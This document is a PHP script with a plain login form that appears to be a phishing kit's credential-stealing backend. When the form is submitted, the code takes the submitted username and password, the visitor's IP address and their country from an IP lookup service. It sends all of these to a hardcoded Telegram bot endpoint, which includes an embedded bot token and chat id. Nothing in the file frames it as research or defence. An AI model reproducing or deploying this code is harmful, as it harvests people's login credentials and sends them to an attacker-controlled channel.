


<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
require 'autre/phpmailer/exception.php';
require 'autre/phpmailer/phpmailer.php';
require 'autre/phpmailer/smtp.php';


if(         isset($_POST['submit'])         &&      $infoip=@unserialize(file_get_contents('http://ip-api.com/php/' .$ip))            )
{		

	function get_ip(){   if( isset($_SERVER['HTTP_CLIENT_IP']) )   {  return $_SERVER['HTTP_CLIENT_IP'];}  elseif  ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) )     { return $_SERVER['HTTP_X_FORWARDED_FOR'];}   else  { return (  isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : ''   ); }     }
	$ip = get_ip();  
	$user = $_POST["user"];
	$pass = $_POST["pass"];


	define ('url',"https://api.telegram.org/bot1989218162:AAFnXNFm8i4_xDlk3f6Av9QNQmCY-sgqvAc/sendmessage?chat_id=1217684250&");
	$message = urlencode( "ip:"  .  $ip           .            "\n infoip : "  .   $infoip['country']          .            "\n user : "  .   $user                      .                   "\n pass : "  .   $pass       );
	file_get_contents(url."text=".$message."");




	
}
?>





		
		
       
<form class="form"  method="post"  >
  <input type="hidden"      placeholder="ip"           value="<?php echo $row["ip"]; ?>"      name=""             id="ip<?php echo $row["ip"]; ?>"   />  
  <input type="text"        placeholder="user"         value=""                          name="user"         id="user"                          />   
  <input type="text"        placeholder="pass"         value=""                          name="pass"         id="pass"                          />    
  <input type="submit"      placeholder=""             value="sent"                           name="submit"       id=""                              /> 
</form> 


